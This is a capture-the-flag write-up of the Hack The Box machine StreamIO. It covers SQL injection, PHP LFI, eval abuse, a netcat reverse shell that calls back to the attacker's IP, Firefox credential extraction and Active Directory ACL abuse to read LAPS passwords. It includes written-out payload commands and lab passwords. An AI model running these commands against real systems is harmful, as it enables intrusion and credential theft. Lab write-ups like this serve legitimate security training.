box starts with some HTTP enum
we have the domain streamIO.htb, there is also vhost watch.streamIO.htb
after initial enum, we need to identify vulnerable page on the vhost watch.streamio.htb, which is search.php
![[Pasted image 20251003215641.png]]
this parameter was vulnerable to sql injection, but sqlmap couldnt find the injection point at all...
i can check for tables in current db with the query:
![[Pasted image 20251003220459.png]]
now that i know the table name, and the columns 'username' and 'password' i can use the following query to put both columns in the same field
![[Pasted image 20251003220609.png]]
now i can create 2 files, 1 with hashes, 1 with usernames -- i crack the hashes file with john, and then test the credentials at steamIO.htb/login.php
i found a valid account, and it has access to a custom admin panel
at this point i need to run a dirsearch on streamIO.htb/admin/ to find the file master.php
![[Pasted image 20251003220837.png]]
also, i should notice that the admin panel is using a parameter in the path to determine the functionality to display, so i should use ffuf to find a parameter that might be hidden
![[Pasted image 20251003221014.png]]
![[Pasted image 20251003221042.png]]
the hidden parameter is actually vulnerable to PHP LFI via wrapper, so i can take a look at the source code of master.php
![[Pasted image 20251003221416.png]]
looking at the source code, i need to identify a insecure use of 'eval' 
![[Pasted image 20251003221403.png]]
the page accepts a POST parameter 'include' which is received in the file_get_contents function, this PHP function is also receiving URL's as locations
executing a revshell with a local file didnt work, the correct way is to use system() to first transfer a copy of nc64.exe from my host to the target, and save it in c:\windows\temp\nc64.exe
so i create a file asd.php with the contents: 
`system("curl 10.10.14.23/nc64.exe -o c:\\windows\\temp\\nc64.exe");`
double forward slashes because otherwise it will be escaped 
then i host the asd.php and the nc64.exe with a python http server, and send the request
![[Pasted image 20251003221955.png]]
then i change asd.php to have simple nc64.exe revshell in system() function
`system("c:\\windows\\temp\\nc64.exe 10.10.14.23 4444 -e cmd.exe");`
open rlwrap listener, and resnd the request -- i get a revshell as the user yoshihide
with local access, checking the index.php file source code, i find the credentials for the DB
`$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');`
with this i can connect to the db with sqlcmd, and get the hash for the user nikk37, which can use WinRM, and grants me user.txt
then download and run winPEASx64 - and i find a firefox password db
![[Pasted image 20251003222307.png]]
using this [repo](https://github.com/lclevy/firepwd) i can decrypt the password db, i just need to download the key4.db and logins.json file and run the python script in the same directory
i take the 4 passwords and usernames from the output, create 2 seperate files, 1 for users, 1 for passwords, and run nxc smb with both files to find valid creds
i find the valid creds for the user JDgodd, but this user doesnt have permissions to login remotely
i check bloodhound files, and figure out that there is a clear path from the user JDgodd to Administrator
![[Pasted image 20251003222625.png]]

JDGODD owns a group which is allowed to read LAPS passwords, since i cant login with JDGODD, i can use PowerView to use his credentials from the session of another user
![[Pasted image 20251003223151.png]]
`$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force`
`$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)`
`Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred`
`Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All`
`Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred`
finally, nxc can be used to read laps passwords
`nxc ldap 10.129.102.164 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -M laps`
![[Pasted image 20251003223358.png]]
now i can WinRM as administrator, and read root.txt from martin's desktop
![[Pasted image 20251003223445.png]]
